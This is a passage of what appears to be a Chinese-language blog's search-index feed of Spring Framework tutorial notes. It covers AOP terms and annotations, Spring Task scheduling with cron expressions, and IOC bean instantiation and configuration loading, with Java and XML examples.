<strong>Pointcut（切入点）</strong></p><p>对连接点进行拦截的定义（匹配规则定义 规定拦截哪些方法，对哪些方法进行处理），spring有专门的表达式语言定义</p><p><strong>Advice（通知）</strong></p><table><thead><tr><th>通知类型</th><th>描述</th></tr></thead><tbody><tr><td>前置通知（前置增强）</td><td>执行方法前通知</td></tr><tr><td>返回通知（返回增强）</td><td>方法正常结束返回后的通知</td></tr><tr><td>异常抛出通知（异常抛出增强）</td><td>出现异常时的通知</td></tr><tr><td>最终通知</td><td>无论方法是否发生异常，均会执行该通知</td></tr><tr><td>环绕通知</td><td>包围一个连接点（join point）的通知，如方法调用。最强大的一种通知类型，环绕通知可以在方法调用前后完成自定义的行为，它也会选择是否继续执行连接点或直接返回它们自己的返回值或抛出异常</td></tr></tbody></table><p><strong>Aspect（切面）</strong></p><p>切入点与通知的结合，决定了切面的定义，切入点定义了要拦截哪些类的哪些方法，通知则定义了拦截过方法后要做什么，切面则是横切关注点的抽象，与类相似，类是对物体特征的抽象，切面则是横切关注点抽象</p><p><strong>Target（目标对象）</strong></p><p>被代理的目标对象</p><p><strong>Weave（织入）</strong></p><p>将切面应用到目标对象并生成代理对象的这个过程即为织入</p><p><strong>Introduction（引入）</strong></p><p>在不修改原有应用程序代码的情况下，在程序运行期为类动态添加方法或者字段的过程称为引入</p><br/><h2 id="AOP实现"><a href="#AOP实现" class="headerlink" title="AOP实现"></a>AOP实现</h2><p>AOP需要引入依赖并在配置文件中添加命名空间</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/aop</span><br><span class="line">http://www.springframework.org/schema/aop/spring-aop.xsd</span><br></pre></td></tr></table></figure><p>开启AOP注解支持</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="注解实现"><a href="#注解实现" class="headerlink" title="注解实现"></a>注解实现</h3><p><strong>AOP切入点表达式</strong></p><p>AOP切入点表达式用于匹配<code>@Pointcut</code>注解要拦截的方法，其语法主要由<code>*</code>和<code>.</code>组成。表达式的第部分由指定的访问修饰符组成，有<code>public</code>、<code>private</code>、<code>protected</code>、<code>*</code>四种类型；第二部分可以指定包位置，表示只拦截在该包下的方法，若最后为<code>..</code>代表也包括子包的方法，该部分若为空代表拦截范围为全局；第三部分是要拦截的类名；第四部分为该类的方法名；第五部分为传入该方法的参数</p><table><thead><tr><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>拦截所有公共方法</td><td><code>public *(..)</code></td></tr><tr><td>拦截任意<code>setter</code>方法</td><td><code>* set*(..)</code></td></tr><tr><td>指定某个包下的任意方法</td><td><code>* com.xxx.*.*(..)</code></td></tr><tr><td>指定某个包及其子包下的任意方法</td><td><code>* com.xxx..*.*(..)</code></td></tr></tbody></table><p><strong>具体注解</strong></p><p><code>@Aspect</code>注解标记在一个类上，表示这个类是一个切面</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@Pointcut</code>注解标记在一个方法上，该方法体必须为空。该方法具有<code>value</code>属性，表示要拦截的方法，该属性使用AOP切入点表达式进行指定</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Pointcut(&quot;execution(* com.example.service.*.*(..))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">allServiceMethods</span><span class="params">()</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>下面的注解都声明了一个通知类类型，它们都具有<code>value</code>属性，一般指向<code>@Pointcut</code>注解记在的方法</p><p><code>@Before</code>注解声明前置通知，目标类的方法执行前执行该通知</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;loginMethod()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">beforeLogin</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;用户尝试登录...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@AfterReturning</code>注解声明返回通知，目标类的方法无异常执行后执该通知</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AfterReturning(pointcut = &quot;createOrderMethod()&quot;, returning = &quot;orderId&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCreateOrder</span><span class="params">(Long orderId)</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;订单创建成功，订单号：&quot;</span> + orderId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@After</code>注解声明最终通知，目标类的方法执行后不论有无异常都会执行该通知</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@After(&quot;uploadMethod()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterUpload</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;文件上传操作结束，清理临时资源&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@AfterThrowing</code>注解声明异常通知，目标类的方法执行异常时执行该通知</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AfterThrowing(pointcut = &quot;payMethod()&quot;, throwing = &quot;ex&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPaymentFailed</span><span class="params">(Exception ex)</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;支付失败，异常信息：&quot;</span> + ex.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@Around</code>注解环绕通知，目标类的方法执行前后都可通过环绕通知定义响应内容，该通知需要通过显示调用传入的<code>ProceedingJoinPoint</code>对象的<code>proceed()</code>，这相当于明确告诉程序何处为何种通知，<code>proceed()</code>本身不执行任何功能</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;controllerMethods()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">aroundController</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;请求开始处理&quot;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> pjp.proceed();</span><br><span class="line">        </span><br><span class="line">System.out.println(<span class="string">&quot;请求处理完成&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@AfterReturning</code>和<code>@AfterThrowing</code>搭配别的属性时一般使用<code>pointcut</code>指定要拦截的方法</p><h3 id="XML实现"><a href="#XML实现" class="headerlink" title="XML实现"></a>XML实现</h3><p>通过配置文件实现AOP不需要修改原先的代码结构，只需要把注解对应修改到配置文件上即可，以先前的例子说，配置文件修改为如下，再删除原切面的注解即可 </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--aop切面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;LogAspect&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--定义aop 切入点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;allServiceMethods&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.example.service.*.*(..))&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置前置通知 指定前置通知方法名 并引用切入点定义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;beforeLogin&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;allServiceMethods&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置返回通知 指定返回通知方法名 并引用切入点定义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:after-returning</span> <span class="attr">method</span>=<span class="string">&quot;afterCreateOrder&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;allServiceMethods&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置异常通知 指定异常通知方法名 并引用切入点定义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:after-throwing</span> <span class="attr">method</span>=<span class="string">&quot;afterPaymentFailed&quot;</span> <span class="attr">throwing</span>=<span class="string">&quot;ex&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;allServiceMethods&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置最终通知 指定最终通知方法名 并引用切入点定义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;afterUpload&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;allServiceMethods&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置环绕通知 指定环绕通知方法名，并引用切入点定义--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:around</span> <span class="attr">method</span>=<span class="string">&quot;aroundController&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;allServiceMethods&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上，容易发现AOP就是更加灵活且多样的动态代理模式，目的还是在于目标行为的增强</p><br/><h1 id="SpringFramework框架-Task"><a href="#SpringFramework框架-Task" class="headerlink" title="SpringFramework框架-Task"></a>SpringFramework框架-Task</h1><p>Spring Task 是 Spring 框架提供的轻量级定时任务调度组件，用于在 Spring 应用中简单、便捷地实现定时任务。</p><h2 id="XML配置实现"><a href="#XML配置实现" class="headerlink" title="XML配置实现"></a>XML配置实现</h2><p>配置文件添加命名空间</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:task=&quot;http://www.springframework.org/schema/task&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/task</span><br><span class="line">http://www.springframework.org/schema/task/spring-task.xsd</span><br></pre></td></tr></table></figure><p>设置定时任务方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShortTask</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;定时任务执行：&quot;</span> + System.currentTimeMillis());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置配置文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">task:scheduled-tasks</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 定时任务1 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">task:scheduled</span> <span class="attr">ref</span>=<span class="string">&quot;shortTask&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span> <span class="attr">cron</span>=<span class="string">&quot;0/2 * * * * ?&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">task:scheduled-tasks</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试类中，只要获得了bean对象就会自动执行方法</p><br/><h2 id="注解实现-1"><a href="#注解实现-1" class="headerlink" title="注解实现"></a>注解实现</h2><p><code>@Scheduled</code>注解标记于需要设置定时任务的方法上，该注解具有<code>cron</code>属性，用于写入cron表达式设置相关定时规则</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShortTask</span> &#123;</span><br><span class="line">    <span class="meta">@Scheduled(cron = &quot;0/2 * * * * ?&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;定时任务执行：&quot;</span> + System.currentTimeMillis());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件设置定时任务驱动，用于识别<code>@Scheduled</code>注解</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;task:annotation-driven/&gt;</span><br></pre></td></tr></table></figure><br/><h2 id="Cron表达式"><a href="#Cron表达式" class="headerlink" title="Cron表达式"></a>Cron表达式</h2><p>cron表达式的格式为<code>秒 分 时 日 月 周 年(可选)</code></p><h3 id="各字段取值范围和特殊字符"><a href="#各字段取值范围和特殊字符" class="headerlink" title="各字段取值范围和特殊字符"></a>各字段取值范围和特殊字符</h3><table><thead><tr><th align="left">字段</th><th align="left">允许值</th><th align="left">允许的特殊字符</th></tr></thead><tbody><tr><td align="left">秒</td><td align="left">0-59</td><td align="left"><code>, - * /</code></td></tr><tr><td align="left">分</td><td align="left">0-59</td><td align="left"><code>, - * /</code></td></tr><tr><td align="left">时</td><td align="left">0-23</td><td align="left"><code>, - * /</code></td></tr><tr><td align="left">日</td><td align="left">1-31</td><td align="left"><code>, - * ? / L W</code></td></tr><tr><td align="left">月</td><td align="left">1-12 或 JAN-DEC</td><td align="left"><code>, - * /</code></td></tr><tr><td align="left">周</td><td align="left">0-7 或 SUN-SAT（0和7都是周日）</td><td align="left"><code>, - * ? / L #</code></td></tr><tr><td align="left">年（可选）</td><td align="left">1970-2099</td><td align="left"><code>, - * /</code></td></tr></tbody></table><h3 id="特殊字符含义"><a href="#特殊字符含义" class="headerlink" title="特殊字符含义"></a>特殊字符含义</h3><table><thead><tr><th align="left">字符</th><th align="left">含义</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>*</code></td><td align="left">所有值</td><td align="left"><code>* * * * * ?</code></td><td align="left">每秒执行</td></tr><tr><td align="left"><code>?</code></td><td align="left">不指定值</td><td align="left"><code>0 0 10 * * ?</code></td><td align="left">每天10点，不关心周几</td></tr><tr><td align="left"><code>-</code></td><td align="left">区间</td><td align="left"><code>0 0 10-12 * * ?</code></td><td align="left">10点、11点、12点</td></tr><tr><td align="left"><code>,</code></td><td align="left">多个值</td><td align="left"><code>0 0 10,14,18 * * ?</code></td><td align="left">10点、14点、18点</td></tr><tr><td align="left"><code>/</code></td><td align="left">步长</td><td align="left"><code>0 0/5 * * * ?</code></td><td align="left">每5分钟</td></tr><tr><td align="left"><code>L</code></td><td align="left">最后</td><td align="left"><code>0 0 L * * ?</code></td><td align="left">每月最后一天</td></tr><tr><td align="left"><code>W</code></td><td align="left">工作日</td><td align="left"><code>0 0 0 15W * ?</code></td><td align="left">离15号最近的工作日</td></tr><tr><td align="left"><code>#</code></td><td align="left">第几个</td><td align="left"><code>0 0 0 ? * 2#3</code></td><td align="left">每月第3个周二</td></tr></tbody></table><br/>]]></content>
      
      
      <categories>
          
          <category> 简易开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringFramework框架-IOC</title>
      <link href="/2025/12/26/SpringFramework%E6%A1%86%E6%9E%B6-IOC/"/>
      <url>/2025/12/26/SpringFramework%E6%A1%86%E6%9E%B6-IOC/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringFramework框架-IOC"><a href="#SpringFramework框架-IOC" class="headerlink" title="SpringFramework框架-IOC"></a>SpringFramework框架-IOC</h1><p>IOC（控制反转）是一种设计思想，它将传统程序中由开发者主动创建和管理对象的控制权反转给外部容器。在这种模式下，程序不再通过<code>new</code>关键字直接实例化对象，而是由容器负责对象的生命周期管理、依赖注入和配置组装</p><br/><h2 id="Bean对象的实例化"><a href="#Bean对象的实例化" class="headerlink" title="Bean对象的实例化"></a>Bean对象的实例化</h2><p>在Spring框架中，类的生命周期由Spring容器管理，是普通Java类的实例，这种机制的底层是通过反射获取类并新建实例化的。一般有三种方法用于获取实例对象</p><h3 id="构造器实例化"><a href="#构造器实例化" class="headerlink" title="构造器实例化"></a>构造器实例化</h3><p>先创建一个类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function of TestBean is invoked...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>resource</code>目录下新建XML配置文件，这里取名<code>spring.xml</code>容器会通过这个文件解析类对象</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- collaborators and configuration for this bean go here --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>id</code>属性是辨识该bean的唯一标识，<code>class</code>属性指向该类的class路径，此外<code>&lt;bean&gt;</code>标签下还可以定义很多子标签，但目前暂不涉及。</p><p>接下来测试使用Spring获取一个实例化对象，需要实例化一个<code>ClassPathXmlApplicationContext</code>类并传入xml文件名用以解析，之后就可通过<code>getBean()</code>方法获取实例，并能正常调用该实例的方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br><span class="line">        testBean.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="静态工厂实例化"><a href="#静态工厂实例化" class="headerlink" title="静态工厂实例化"></a>静态工厂实例化</h3><p>写一个<code>TestBean2</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;TestBean2 test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再写一个<code>StaticFactory</code>用来执行构造方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TestBean2 <span class="title function_">getTestBean2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TestBean2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写配置文件时，<code>class</code>属性需要指向<code>StaticFactory</code>类，并添加<code>factory-method</code>属性，指向<code>TestBean2</code>的构造方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=<span class="string">&quot;testBean2&quot;</span> class=<span class="string">&quot;Factory.StaticFactory&quot;</span> factory-method=<span class="string">&quot;getTestBean2&quot;</span>&gt;</span><br><span class="line">        &lt;!-- collaborators and configuration <span class="keyword">for</span> <span class="built_in">this</span> bean go here --&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>测试程序如下，能够正常获取实例对象并调用相应方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">TestBean2</span> <span class="variable">testBean2</span> <span class="operator">=</span> (TestBean2) context.getBean(<span class="string">&quot;testBean2&quot;</span>);</span><br><span class="line">        testBean2.Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了静态工厂实例化还有一个实例工厂实例化，不同点在于实例工厂的构造方法不是静态方法，这种构造方法要单独为工厂和目标类写配置文件，本质是先实例化工厂再调用构造方法</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;InstanceFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Factory.InstanceFactory&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;InstanceFactory&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;getTestBean2&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- collaborators and configuration for this bean go here --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>IOC创建的实例化对象是单例，获取的同类对象都是一个对象，因此运行下面的程序会打印<code>true</code>，并且由于这种构造方式只能调用空构造器，这要求目标类的空构造方法必须存在</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br><span class="line">        <span class="type">TestBean</span> <span class="variable">testBean2</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br><span class="line">        System.out.println(testBean2==testBean);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="配置文件加载"><a href="#配置文件加载" class="headerlink" title="配置文件加载"></a>配置文件加载</h2><p>配置文件中bean的<code>class</code>属性可以是相对路径也可以是绝对路径，对于多个配置文件主要有两种加载方法</p><h3 id="利用可变参数加载"><a href="#利用可变参数加载" class="headerlink" title="利用可变参数加载"></a>利用可变参数加载</h3><p><code>ClassPathXmlApplicationContext()</code>里传递的参数可以是多个，如果想要加载多个配置文件可以直接传递多个参数，比如</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring1.xml&quot;</span>,<span class="string">&quot;spring2.xml&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="通过总配置文件加载"><a href="#通过总配置文件加载" class="headerlink" title="通过总配置文件加载"></a>通过总配置文件加载</h3><p>配置文件中可以使用<code>impoirt</code>加载子配置文件，后面调用<code>ClassPathXmlApplicationContext()</code>时只需要传递总配置文件即可，比如在<code>spring.xml</code>文件中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=<span class="string">&quot;testBean&quot;</span> class=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span><br><span class="line">        &lt;!-- collaborators and configuration <span class="keyword">for</span> <span class="built_in">this</span> bean go here --&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;<span class="keyword">import</span> resource=<span class="string">&quot;subSpring.xml&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>该配置文件同时包含了<code>subSpring.xml</code>的配置信息</p><br/><h2 id="手动装配（注入）"><a href="#手动装配（注入）" class="headerlink" title="手动装配（注入）"></a>手动装配（注入）</h2><p>注入是指由外部容器将依赖对象自动设置到目标对象的属性或构造函数中，而不是由对象自己主动去获取，比如下面</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> TestBean2 testBean2;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(TestBean2 testBean2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2 = testBean2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>testBean2</code>对象集成进了<code>TestBean</code>类的属性<code>testBean2</code>，这样就不用在类的内部实例化<code>TestBean2</code>，而是通过外部将<code>testBean2</code>传进来实现对其的依赖</p><h3 id="set注入"><a href="#set注入" class="headerlink" title="set注入"></a>set注入</h3><p>使用set注入实现上面的例子需要实现set()方法对<code>testBean2</code>进行赋值并调用其方法，如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> TestBean2 testBean2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span 